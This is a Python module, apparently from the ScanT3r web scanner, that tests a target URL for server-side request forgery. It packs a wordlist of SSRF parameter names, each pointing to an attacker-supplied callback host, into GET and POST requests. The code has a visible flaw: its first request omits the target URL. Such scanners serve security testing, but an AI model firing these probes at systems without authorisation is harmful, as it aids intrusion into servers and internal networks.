#!/usr/bin/env python3
__name__ = 'ScanT3r'
__author__ = 'Khaled Nassar'
__email__ = 'knassar702@gmail.com'
__version__ = '0.6#Beta'
from libs import NewRequest as nq
from libs import post_data,urlencoder
from core import bad
from urllib.parse import urlparse
from wordlists import ssrf_parameters


def GO(url,host):
    d = "?r="+urlencoder(f'{host}/r')
#    print(d)
    l = len(ssrf_parameters)
    for par in ssrf_parameters:
        pay = urlencoder(f'{host}/{par}')
        d += f'&{par}={pay}'
#        print(d)
        if len(d) > l*3:
            nq.Get(d)
            nq.Post(url.split('?')[0],urlparse(d).query)
            d = f"{url.split('?')[0]}?r={host}/r"

def main(opts):
    global host
    host = opts['host']
    if host == None:
        print(f'{bad} Host Not Found ..!')
    else:
        GO(opts['url'],host)